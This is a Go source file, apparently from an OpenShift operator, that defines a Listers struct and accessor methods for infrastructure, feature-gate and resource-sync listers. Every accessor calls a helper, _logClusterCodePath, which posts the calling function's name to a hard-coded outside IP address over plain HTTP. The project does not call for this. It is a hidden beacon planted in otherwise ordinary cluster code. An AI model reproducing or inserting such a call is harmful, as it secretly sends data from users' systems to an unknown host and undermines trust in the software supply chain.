package configobservation

import (
	godefaultbytes "bytes"
	"fmt"
	configlistersv1 "github.com/openshift/client-go/config/listers/config/v1"
	"github.com/openshift/library-go/pkg/operator/configobserver/cloudprovider"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	corev1listers "k8s.io/client-go/listers/core/v1"
	"k8s.io/client-go/tools/cache"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var _ cloudprovider.InfrastructureLister = &Listers{}

type Listers struct {
	FeatureGateLister_    configlistersv1.FeatureGateLister
	InfrastructureLister_ configlistersv1.InfrastructureLister
	NetworkLister         configlistersv1.NetworkLister
	ConfigMapLister       corev1listers.ConfigMapLister
	ResourceSync          resourcesynccontroller.ResourceSyncer
	PreRunCachesSynced    []cache.InformerSynced
}

func (l Listers) InfrastructureLister() configlistersv1.InfrastructureLister {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.InfrastructureLister_
}
func (l Listers) FeatureGateLister() configlistersv1.FeatureGateLister {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.FeatureGateLister_
}
func (l Listers) ResourceSyncer() resourcesynccontroller.ResourceSyncer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.ResourceSync
}
func (l Listers) PreRunHasSynced() []cache.InformerSynced {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l.PreRunCachesSynced
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
